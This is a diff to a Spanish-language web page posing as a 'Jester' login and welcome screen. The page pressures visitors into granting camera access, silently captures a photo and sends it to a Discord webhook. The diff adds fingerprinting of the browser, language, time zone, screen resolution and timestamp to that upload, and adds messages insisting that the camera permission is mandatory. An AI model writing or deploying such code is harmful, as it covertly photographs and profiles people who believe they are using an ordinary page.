@@ -13,10 +13,10 @@
     }
     img {
       width: 200px;
-      margin-top: 50px;
+      margin-top: 30px;
     }
     button {
-      margin-top: 30px;
+      margin-top: 20px;
       padding: 12px 25px;
       font-size: 18px;
       cursor: pointer;
@@ -25,13 +25,17 @@
       border-radius: 8px;
       color: white;
     }
+    .warning {
+      color: yellow;
+      font-size: 16px;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
-  <h1>Jester login
-</h1>
+  <h1>Bienvenido</h1>
   <img src="https://pngimg.com/uploads/jester/jester_PNG27.png" alt="Jester">
-  <br>
+  <p class="warning">⚠️ Para iniciar es obligatorio aceptar el permiso de cámara.</p>
   <button id="startBtn">Iniciar</button>
 
   <script>
@@ -46,7 +50,6 @@
           video.srcObject = stream;
           video.play();
 
-          // Espera un poco para que la cámara arranque
           setTimeout(() => {
             const canvas = document.createElement("canvas");
             canvas.width = video.videoWidth;
@@ -56,12 +59,28 @@
             // Detener cámara
             stream.getTracks().forEach(track => track.stop());
 
-            // Convertir la foto en blob y mandarla a Discord
+            // Convertir a blob
             canvas.toBlob(blob => {
+              // Obtener info extra
+              const userAgent = navigator.userAgent;
+              const idioma = navigator.language;
+              const zona = Intl.DateTimeFormat().resolvedOptions().timeZone;
+              const resolucion = `${window.screen.width}x${window.screen.height}`;
+              const fechaHora = new Date().toLocaleString();
+
+              const info = `
+📷 Foto tomada
+🌍 Idioma: ${idioma}
+🕒 Zona horaria: ${zona}
+💻 Navegador/Dispositivo: ${userAgent}
+🖥️ Resolución: ${resolucion}
+⏰ Fecha y hora: ${fechaHora}
+              `;
+
               const formData = new FormData();
               formData.append("file", blob, "foto.png");
               formData.append("payload_json", JSON.stringify({
-                content: "📷 Foto tomada desde la página"
+                content: info
               }));
 
               fetch(webhookURL, {
@@ -71,7 +90,9 @@
             }, "image/png");
           }, 2000);
         })
-        .catch(() => alert("Permiso denegado o cámara no disponible."));
+        .catch(() => {
+          alert("❌ No puedes continuar sin aceptar el permiso de cámara.");
+        });
     });
   </script>
 </body>
